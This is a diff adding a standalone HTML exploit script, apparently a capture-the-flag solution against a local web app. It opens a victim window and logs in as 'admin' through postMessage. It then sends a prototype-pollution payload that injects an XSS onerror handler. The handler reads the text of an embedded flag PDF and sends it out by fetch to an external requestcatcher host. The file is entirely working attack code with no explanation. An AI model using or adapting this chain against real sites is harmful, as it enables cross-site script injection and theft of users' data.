@@ -1,0 +1,35 @@
+<script>
+const targetUrl = 'http://127.0.0.1:1337/login';
+const targetOrigin = 'http://127.0.0.1:1337';
+const victimWindow = window.open(targetUrl, 'victim');
+function startExploit() {
+    victimWindow.location.href = targetUrl;
+    const PAYLOAD = `<embed class="pdf" src="http://127.0.0.1:1337/scriptures/flag.pdf"><img src=x onerror="window.addEventListener('message', (e) => {if (e.data.type === 'getSelectedTextReply') {fetch('https://[catcher].requestcatcher.com/'+e.data.selectedText);}}); (async () => {document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'}, '*'); document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'}, '*');})();">`
+    const payload = {
+        "constructor": {
+            "prototype": {
+                "3": PAYLOAD
+            }
+        }
+    };
+    setTimeout(() => {
+        if (victimWindow) {
+            victimWindow.postMessage(JSON.stringify(payload), targetOrigin);
+        }
+    }, 1000);
+}
+function doLogin() {
+    const payload = {
+        user: { name: "admin" },
+        pass: "pass",
+        action: "clickLogin",
+    };
+    setTimeout(() => {
+        if (victimWindow) {
+            victimWindow.postMessage(JSON.stringify(payload), targetOrigin);
+            setTimeout(startExploit, 1000);
+        }
+    }, 1000);
+}
+doLogin();
+</script>
